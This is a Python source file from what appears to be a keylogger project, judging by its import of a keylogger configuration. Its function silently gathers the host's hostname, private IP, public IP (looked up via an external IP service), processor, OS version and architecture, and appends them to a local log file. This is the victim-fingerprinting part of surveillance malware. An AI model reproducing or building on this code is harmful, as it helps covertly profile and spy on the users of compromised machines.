import platform
import socket

from requests import get

from config.keylogger_config import COMPUTER_INFO_FILE_NAME


def get_computer_information(output_file_name=COMPUTER_INFO_FILE_NAME):
    hostname = socket.gethostname()
    ip_addr = socket.gethostbyname(hostname)

    with open(output_file_name, 'a') as file:
        try:
            public_ip = get("https://api.ipify.org").text
            file.write('\n### COMPUTER INFORMATION ### \n')
            file.write("Public IP Address: " + public_ip + '\n')
            file.write("Processor: " + (platform.processor()) + '\n')
            file.write("System: " + platform.system() + " " + platform.version() + '\n')
            file.write("Machine: " + platform.machine() + '\n')
            file.write("Hostname: " + hostname + '\n')
            file.write("Private IP Address: " + ip_addr +  '\n')
        except Exception:
            file.write("Couldn't get computer information")


if __name__ == '__main__':    
    get_computer_information()
